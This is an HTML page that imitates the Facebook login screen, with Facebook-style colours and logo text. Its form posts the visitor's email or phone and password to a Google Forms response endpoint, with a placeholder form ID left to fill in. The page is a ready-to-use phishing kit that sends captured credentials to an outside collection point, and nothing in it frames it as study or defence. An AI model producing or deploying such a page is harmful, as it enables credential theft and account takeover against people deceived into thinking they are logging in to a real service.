<!DOCTYPE html>
<html>
<head>
    <title>Facebook Login</title>
    <style>
        body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; padding-top: 100px; }
        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px #ccc; width: 300px; text-align: center; }
        .fb-logo { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; }
        .login-btn { background: #1877f2; color: white; border: none; width: 100%; padding: 12px; font-weight: bold; border-radius: 5px; margin: 10px 0; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="fb-logo">facebook</div>
        <form action="https://docs.google.com/forms/d/e/YOUR_FORM_ID/formResponse" method="POST" target="_blank">
            <input type="text" name="entry.123456789" placeholder="Email or phone" required> 
            <input type="password" name="entry.987654321" placeholder="Password" required>
            <button type="submit" class="login-btn">Log In</button>
        </form>
    </div>
</body>
</html>
